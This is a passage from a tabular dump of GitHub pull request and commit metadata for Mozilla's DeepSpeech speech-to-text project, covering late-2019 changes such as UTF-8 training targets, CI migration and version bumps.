On the decoder side, I replaced the old code paths for character based LMs with UTF-8 based character language models. The idea is similar, but because we're predicting UTF-8 bytes directly, the logic for when to score a beam becomes a bit of a hybrid between word and character modes. Each ""word"" is a sequence of UTF-8 bytes that encode a single Unicode codepoint, and we score the beam when the the codepoint boundary is reached, rather when a space character is seen.",reuben,477142,2019-11-12T09:16:35Z,MEMBER,True,268,134,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4cdd988dfccc5004858c30fab84b0f7c39ad0e6,UTF-8 target
1696,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2521,2521,UTF-8 target,"This is the UTF-8 target code. The alphabet size is 255 since we never see a zero byte, so I shift values by -1. With the CTC blank the final layer width is a round 256 units. I added a `--utf8` flag that enables UTF-8 training. Due to the recent changes to embed the alphabet in the exported model, changing from `Alphabet` to `UTF8Alphabet` is pretty much the only thing you have to do for UTF-8 training (this is done in `util/config.py` when initializing `Config.alphabet`). I've also made it so that in UTF-8 mode test report will sort samples by CER rather than WER. This is just for convenience since the main use of UTF-8 mode right now is for Mandarin models.

On the decoder side, I replaced the old code paths for character based LMs with UTF-8 based character language models. The idea is similar, but because we're predicting UTF-8 bytes directly, the logic for when to score a beam becomes a bit of a hybrid between word and character modes. Each ""word"" is a sequence of UTF-8 bytes that encode a single Unicode codepoint, and we score the beam when the the codepoint boundary is reached, rather when a space character is seen.",reuben,477142,2019-11-12T09:16:35Z,MEMBER,True,268,134,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1b1a59423c924e81c96f2a88a09511efdc96aae,Score prefix as soon as a grapheme is formed rather than 1 byte later
1697,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2521,2521,UTF-8 target,"This is the UTF-8 target code. The alphabet size is 255 since we never see a zero byte, so I shift values by -1. With the CTC blank the final layer width is a round 256 units. I added a `--utf8` flag that enables UTF-8 training. Due to the recent changes to embed the alphabet in the exported model, changing from `Alphabet` to `UTF8Alphabet` is pretty much the only thing you have to do for UTF-8 training (this is done in `util/config.py` when initializing `Config.alphabet`). I've also made it so that in UTF-8 mode test report will sort samples by CER rather than WER. This is just for convenience since the main use of UTF-8 mode right now is for Mandarin models.

On the decoder side, I replaced the old code paths for character based LMs with UTF-8 based character language models. The idea is similar, but because we're predicting UTF-8 bytes directly, the logic for when to score a beam becomes a bit of a hybrid between word and character modes. Each ""word"" is a sequence of UTF-8 bytes that encode a single Unicode codepoint, and we score the beam when the the codepoint boundary is reached, rather when a space character is seen.",reuben,477142,2019-11-12T09:16:35Z,MEMBER,True,268,134,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e6952c3a8359d6df25b3786f5aedd4a40f282d3,Avoid reconstructing strings twice on decode
1698,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2521,2521,UTF-8 target,"This is the UTF-8 target code. The alphabet size is 255 since we never see a zero byte, so I shift values by -1. With the CTC blank the final layer width is a round 256 units. I added a `--utf8` flag that enables UTF-8 training. Due to the recent changes to embed the alphabet in the exported model, changing from `Alphabet` to `UTF8Alphabet` is pretty much the only thing you have to do for UTF-8 training (this is done in `util/config.py` when initializing `Config.alphabet`). I've also made it so that in UTF-8 mode test report will sort samples by CER rather than WER. This is just for convenience since the main use of UTF-8 mode right now is for Mandarin models.

On the decoder side, I replaced the old code paths for character based LMs with UTF-8 based character language models. The idea is similar, but because we're predicting UTF-8 bytes directly, the logic for when to score a beam becomes a bit of a hybrid between word and character modes. Each ""word"" is a sequence of UTF-8 bytes that encode a single Unicode codepoint, and we score the beam when the the codepoint boundary is reached, rather when a space character is seen.",reuben,477142,2019-11-12T09:16:35Z,MEMBER,True,268,134,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2eb305b73823efacb3f8de2b480346017c50cd7,Address review comment and add missing check for presence of scorer
1699,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2521,2521,UTF-8 target,"This is the UTF-8 target code. The alphabet size is 255 since we never see a zero byte, so I shift values by -1. With the CTC blank the final layer width is a round 256 units. I added a `--utf8` flag that enables UTF-8 training. Due to the recent changes to embed the alphabet in the exported model, changing from `Alphabet` to `UTF8Alphabet` is pretty much the only thing you have to do for UTF-8 training (this is done in `util/config.py` when initializing `Config.alphabet`). I've also made it so that in UTF-8 mode test report will sort samples by CER rather than WER. This is just for convenience since the main use of UTF-8 mode right now is for Mandarin models.

On the decoder side, I replaced the old code paths for character based LMs with UTF-8 based character language models. The idea is similar, but because we're predicting UTF-8 bytes directly, the logic for when to score a beam becomes a bit of a hybrid between word and character modes. Each ""word"" is a sequence of UTF-8 bytes that encode a single Unicode codepoint, and we score the beam when the the codepoint boundary is reached, rather when a space character is seen.",reuben,477142,2019-11-12T09:16:35Z,MEMBER,True,268,134,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b05b48a0df7fe0f0f7d826f74285c455204da33c,Force build
1700,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2521,2521,UTF-8 target,"This is the UTF-8 target code. The alphabet size is 255 since we never see a zero byte, so I shift values by -1. With the CTC blank the final layer width is a round 256 units. I added a `--utf8` flag that enables UTF-8 training. Due to the recent changes to embed the alphabet in the exported model, changing from `Alphabet` to `UTF8Alphabet` is pretty much the only thing you have to do for UTF-8 training (this is done in `util/config.py` when initializing `Config.alphabet`). I've also made it so that in UTF-8 mode test report will sort samples by CER rather than WER. This is just for convenience since the main use of UTF-8 mode right now is for Mandarin models.

On the decoder side, I replaced the old code paths for character based LMs with UTF-8 based character language models. The idea is similar, but because we're predicting UTF-8 bytes directly, the logic for when to score a beam becomes a bit of a hybrid between word and character modes. Each ""word"" is a sequence of UTF-8 bytes that encode a single Unicode codepoint, and we score the beam when the the codepoint boundary is reached, rather when a space character is seen.",reuben,477142,2019-11-12T09:16:35Z,MEMBER,True,268,134,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7cd8e20045412ff95106f63c9cc784f4f2229f94,Re-export model used by examples with UTF-8 trie
1701,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2516,2516,Fix cleanup on macOS,,lissyx,1645737,2019-11-08T16:03:44Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d3b8f1f1317efc18c5b803764680fec9e2c4019,Fix cleanup on macOS
1702,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2515,2515,UTF-8 target,,reuben,477142,2019-11-08T13:54:21Z,MEMBER,False,209,97,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,25cf1ea1760fa26dd97072428670455736670bd0,UTF-8 target
1703,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2514,2514,Remove first party code from common.a,"These files are much more likely to be edited by us, and having them in common.a slows downs the development hugely because we have to build all the third party libraries every time, even though they never change. This is a good compromise between fast automation builds and good development speed.",reuben,477142,2019-11-08T13:34:36Z,MEMBER,True,6,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae705cf95f9d0e4b891baa6ea763f60a9e4e9dfb,Remove first party code from common.a
1704,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2511,2511,Better instructions for example/vad_transcriber,"The tutorial misses a few steps for the setup and doesn't mention a few common errors.
I also tried to format it better.",bprfh,22616313,2019-11-07T15:36:47Z,CONTRIBUTOR,True,43,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5eb47053e74dcd5530d3e0720a6823051292df1b,"Added clearer instructions for setup and errors

The tutorial misses a few steps for the setup and doesn't mention a few common errors.
I also tried format it better."
1705,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2511,2511,Better instructions for example/vad_transcriber,"The tutorial misses a few steps for the setup and doesn't mention a few common errors.
I also tried to format it better.",bprfh,22616313,2019-11-07T15:36:47Z,CONTRIBUTOR,True,43,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,26f20f989d9cf56a33543069922e4641ee9ff573,"Removed wrong bug note, spelling, wording."
1706,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2510,2510,Add links to examples to README.rst,"Show examples on the first page, so people can easily find them.",bprfh,22616313,2019-11-07T15:34:34Z,CONTRIBUTOR,True,14,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f3f3cbf53638b48ff22c12b105a66fa47b7a09a,"Add links to examples to README.rst

Show examples on the first page, so people can easily find them."
1707,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2510,2510,Add links to examples to README.rst,"Show examples on the first page, so people can easily find them.",bprfh,22616313,2019-11-07T15:34:34Z,CONTRIBUTOR,True,14,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f475f70a4053e1eaa2c13b8f0a2300a3930a68e,"Moved Examples list

Moved the examples list between ""Using a Pre-trained Model"" and ""Training your own Model"" as requested"
1708,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2509,2509,Add README.rst to example Folder,"Give a short description and overview of the content of the folder, so we can link from the main README.rst",bprfh,22616313,2019-11-07T15:32:36Z,CONTRIBUTOR,True,17,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0ddc83c70706fc2803c1fe5708b903d337551686,"Give a short description on what is in the folder

Give a short description and overview of the content of the folder, so we can link from the main README.rst"
1709,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2509,2509,Add README.rst to example Folder,"Give a short description and overview of the content of the folder, so we can link from the main README.rst",bprfh,22616313,2019-11-07T15:32:36Z,CONTRIBUTOR,True,17,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,65d81add96028396acff6158fde7a79f27bec143,"Fixed the title markdown as requested

Changed wrong title markdown from ""==============="" to ""====="", as requested."
1710,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2509,2509,Add README.rst to example Folder,"Give a short description and overview of the content of the folder, so we can link from the main README.rst",bprfh,22616313,2019-11-07T15:32:36Z,CONTRIBUTOR,True,17,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da8a3e546f044d32d3e0b03504e52e0b52995fba,Adjust title formatting
1711,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2507,2507,Bump VERSION to 0.6.0-alpha.14,,lissyx,1645737,2019-11-07T06:28:44Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c7816ee5dd8d474f4aaa255f14598ad13fdbe8d5,Bump VERSION to 0.6.0-alpha.14
1712,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2505,2505,Fix: ms per char minimum for SWC and TUDA importers,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2019-11-06T12:16:01Z,CONTRIBUTOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,343d07173fecb1df83f14ac6a0d84da409aa97c8,Fix: ms per char minimum for SWC and TUDA importers
1713,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2504,2504,Add NodeJS v13,Fixes #2501,lissyx,1645737,2019-11-06T09:17:54Z,COLLABORATOR,True,270,94,99,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,953bee938123519c5b699ec026559d720fd2d20a,"Add NodeJS v13

Fixes #2501"
1714,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2504,2504,Add NodeJS v13,Fixes #2501,lissyx,1645737,2019-11-06T09:17:54Z,COLLABORATOR,True,270,94,99,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de71d6559dcccbd13712ef3345880ba22e7ee790,"Split NodeJS testing per-arch/system

Fixes #2497"
1715,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2500,2500,Improve spurious rebuild checks,,lissyx,1645737,2019-11-06T07:17:27Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ddb88e18e4c3da21e1faef941d119ef1e4582ef6,Improve spurious rebuild checks
1716,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2498,2498,Bump VERSION to 0.6.0-alpha.13,,lissyx,1645737,2019-11-05T15:22:43Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5708a99d508ab80e3f6e85a2a41c7d2399c42d2,Bump VERSION to 0.6.0-alpha.13
1717,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2495,2495,Add ElectronJS v7.0,Fixes #2494,lissyx,1645737,2019-11-05T08:12:14Z,COLLABORATOR,True,86,18,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b152802fd1f3d3d61e830a155ee91bb5c7cb7eb7,"Add ElectronJS v7.0

Fixes #2494"
1718,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2493,2493,Bump VERSION to 0.6.0-alpha.12,,lissyx,1645737,2019-11-05T07:58:27Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e1be01b1d6826383aa27ab500ad7b4b244e6a108,Bump VERSION to 0.6.0-alpha.12
1719,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2492,2492,Update JS doc for changed API,,lissyx,1645737,2019-11-04T19:07:10Z,COLLABORATOR,True,0,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8cbcf1da3c62f7c578e965f244731a58072e16db,Update JS doc for changed API
1720,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2491,2491,Move to TC Community,,lissyx,1645737,2019-11-04T16:51:26Z,COLLABORATOR,True,27,25,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c898d92cb9ef6b4f2de5349b9af6d58bb3b867a,Move to TC Community
1721,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2486,2486,Bug 1574659 - migrate from taskcluster.net to community-tc,This is #2485 with the URL format fixed and a redundant scope removed from `.taskcluster.yml`.,djmitche,28673,2019-11-03T04:03:04Z,CONTRIBUTOR,True,70,76,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27efcf470a44a3e6af781433b064ac33dcf1d9ef,swap taskcluster.net references for community-tc.services.mozilla.com
1722,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2486,2486,Bug 1574659 - migrate from taskcluster.net to community-tc,This is #2485 with the URL format fixed and a redundant scope removed from `.taskcluster.yml`.,djmitche,28673,2019-11-03T04:03:04Z,CONTRIBUTOR,True,70,76,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3501ce15c2ef04032dea29da9ca7fd746c47968f,update taskcluster.yml for community-tc
1723,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2486,2486,Bug 1574659 - migrate from taskcluster.net to community-tc,This is #2485 with the URL format fixed and a redundant scope removed from `.taskcluster.yml`.,djmitche,28673,2019-11-03T04:03:04Z,CONTRIBUTOR,True,70,76,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd12eacafa7f92acb2b5bf5d6af9d26f047cb045,include /api/ in community-tc URLs
1724,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2486,2486,Bug 1574659 - migrate from taskcluster.net to community-tc,This is #2485 with the URL format fixed and a redundant scope removed from `.taskcluster.yml`.,djmitche,28673,2019-11-03T04:03:04Z,CONTRIBUTOR,True,70,76,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c86eca944f36657c5116b8c2da362b8544d5a8e8,remove unnecessary lowest-priority scope
1725,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2485,2485,Bug 1574659: migrate from tasckluster.net to community-tc,"This is a first pass at the things that need to change to move deepspeech's CI from taskcluster.net to the [new community-tc deployment](https://community-tc.services.mozilla.com/)

- replaces instances of `$service.taskcluster.net` with `community-tc.services.mozilla.com/$service` (route based urls instead of subdomains)
- replaces workerTypes and provisionerIds with the new ones defined for the project [here](https://github.com/mozilla/community-tc-config/pull/51/)

Do you see any glaring holes here? My plan is to mirror this conversion for https://github.com/mozilla/tensorflow.

Bug [here](https://bugzilla.mozilla.org/show_bug.cgi?id=1574659)",milescrabill,4430892,2019-11-01T21:20:43Z,CONTRIBUTOR,False,71,76,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27efcf470a44a3e6af781433b064ac33dcf1d9ef,swap taskcluster.net references for community-tc.services.mozilla.com
1726,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2485,2485,Bug 1574659: migrate from tasckluster.net to community-tc,"This is a first pass at the things that need to change to move deepspeech's CI from taskcluster.net to the [new community-tc deployment](https://community-tc.services.mozilla.com/)

- replaces instances of `$service.taskcluster.net` with `community-tc.services.mozilla.com/$service` (route based urls instead of subdomains)
- replaces workerTypes and provisionerIds with the new ones defined for the project [here](https://github.com/mozilla/community-tc-config/pull/51/)

Do you see any glaring holes here? My plan is to mirror this conversion for https://github.com/mozilla/tensorflow.

Bug [here](https://bugzilla.mozilla.org/show_bug.cgi?id=1574659)",milescrabill,4430892,2019-11-01T21:20:43Z,CONTRIBUTOR,False,71,76,37,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3501ce15c2ef04032dea29da9ca7fd746c47968f,update taskcluster.yml for community-tc
1727,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2484,2484,WIP UTF-8 mode,,reuben,477142,2019-11-01T10:14:02Z,MEMBER,False,180,65,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6106ab74b98a4d4284292b023017ae2ac0109727,UTF-8 target
1728,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2483,2483,Check unicode normalization,,lissyx,1645737,2019-10-31T16:27:19Z,COLLABORATOR,True,8,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,489dbad3a43393451c5051dc60a4e049969a339a,Check unicode normalization
1729,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2482,2482,Update evalutate_tflite with wav_filename,,lissyx,1645737,2019-10-31T14:43:56Z,COLLABORATOR,True,16,10,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3240bffbc87ad51417f50e7f64d91fb9b6bcad1,Update evaluate_tflite with wav_filename
1730,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2481,2481,Embed alphabet in model file,Let's see how the tests go.,reuben,477142,2019-10-31T14:25:05Z,MEMBER,True,359,413,161,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c820817794d445746aefb1b5347b35bf5e0c621,Embed alphabet directly in model
1731,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2481,2481,Embed alphabet in model file,Let's see how the tests go.,reuben,477142,2019-10-31T14:25:05Z,MEMBER,True,359,413,161,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3fdc7d422d96b209373fa00076a5d09084a0717e,Remove alphabet param usage
1732,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2481,2481,Embed alphabet in model file,Let's see how the tests go.,reuben,477142,2019-10-31T14:25:05Z,MEMBER,True,359,413,161,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,34314767f77379d57b6f31637e81501b071f8bc7,Fix prod model tests
1733,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2481,2481,Embed alphabet in model file,Let's see how the tests go.,reuben,477142,2019-10-31T14:25:05Z,MEMBER,True,359,413,161,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8ebf9011b10c3539fef3abfdc8dc118c2bf64c7,Address review comments
1734,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2481,2481,Embed alphabet in model file,Let's see how the tests go.,reuben,477142,2019-10-31T14:25:05Z,MEMBER,True,359,413,161,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd6a9d03b1c8d57feabf417cc7d226a092c60092,Use model from Python 3.6 training run
1735,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2481,2481,Embed alphabet in model file,Let's see how the tests go.,reuben,477142,2019-10-31T14:25:05Z,MEMBER,True,359,413,161,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,10c652b420a91f696c34dd6d0f48f886f90cf6d9,Document serialization format
1736,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2480,2480,Relative paths in M-AILAB importer,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2019-10-30T15:19:53Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96a720c597e05fab8f2372ec16a73e7af052e156,Relative paths in M-AILAB importer
1737,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2479,2479,"Removing exclamation-marks, colons and semi-colons from labels",,tilmankamp,5991088,2019-10-30T15:15:52Z,CONTRIBUTOR,True,4,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d38a3f13f73ae6d4e782fd4cb4a36f9eaf9a16e4,"Removing exclamation-marks, colons and semi-colons from labels"
1738,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2478,2478,Fix for empty skip list case; making linter happy,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2019-10-30T12:05:09Z,CONTRIBUTOR,True,14,14,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,df1df83720218c741394c7e97595e013605d23cf,Fix for empty skip list case; making linter happy
1739,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2475,2475,Improve training startup time,"This makes training startup about 3x faster in my Mandarin runs, with the biggest difference coming from the `DataFrame.apply` change. It seems `apply` with `result_type='broadcast'` causes Pandas to have to copy of the entire DataFrame. Since we only modify the transcript anyway, I made it so that `text_to_char_array` takes in a series but returns just the transcript and used `result_type='reduce'` instead.",reuben,477142,2019-10-29T10:31:22Z,MEMBER,True,10,20,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b39da7f8b7fe08036aa30de84c046d448e8401ab,Improve training startup time
1740,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2473,2473,"added alias for trie,alphabet,lm_binary in util/flags to match module","

This adds alias according to $deepspeech --lm --trie --alphabet
with DeepSpeech.py and evaluate.py that use other names for the same flags",safa0,54358381,2019-10-28T23:31:54Z,NONE,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4138a2571a7bd6919f17530dbcb8aca4bd5e3c4d,"added alias for trie,alphabet,lm_binary in util/flags to match module flags

This matches $deepspeech --lm --trie --alphabet
with DeepSpeech.py and evaluate.py that use other names for the same flags"
1741,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2471,2471,Added executable flag to some importers,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2019-10-28T13:40:04Z,CONTRIBUTOR,True,2,0,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cf6245847fd34418b1f49b5c83d9ac2eedcd4557,Added executable flag to some importers
1742,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2470,2470,Making sample paths relative; additional sub-sets,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2019-10-28T11:30:21Z,CONTRIBUTOR,True,2,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cef7c45f03230038e9f0306e0e6bdc5c62143a5b,Making sample paths relative; additional sub-sets
1743,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2469,2469,adding amp doc,To reflect new functionality in https://github.com/mozilla/DeepSpeech/pull/2434,vinhngx,7205508,2019-10-27T23:30:36Z,CONTRIBUTOR,True,13,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b105640d281f4d883e07a2349ae4a73bf446f111,adding amp doc
1744,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2467,2467,Bump VERSION to 0.6.0-alpha.11,,lissyx,1645737,2019-10-26T10:03:06Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3889739a9b11adb98132213734ebd02e60972475,Bump VERSION to 0.6.0-alpha.11
1745,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9bf4d73641d48481e3745b359c49707d79783f4,Generate augmented data sets
1746,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abd693f4c5e0c679b8e22f3afe3f0fb4d53aa4cd,Installing libsndfile1
1747,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3b53110e21c59481a380e46326eb118543e6c665,Installing ffmpeg
1748,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e401b9aa1414a68d953744537beea9c6c80d29a,Moving old set to a backup dir
1749,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c411c2921ac6f64298a584a31f5103a8adbee8c,Changing cwd to target data-set dir (for tmp file handling)
1750,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76cf78581dc36f8ea693f310ce8e53a9c4be119d,Re-entrant and beter logging
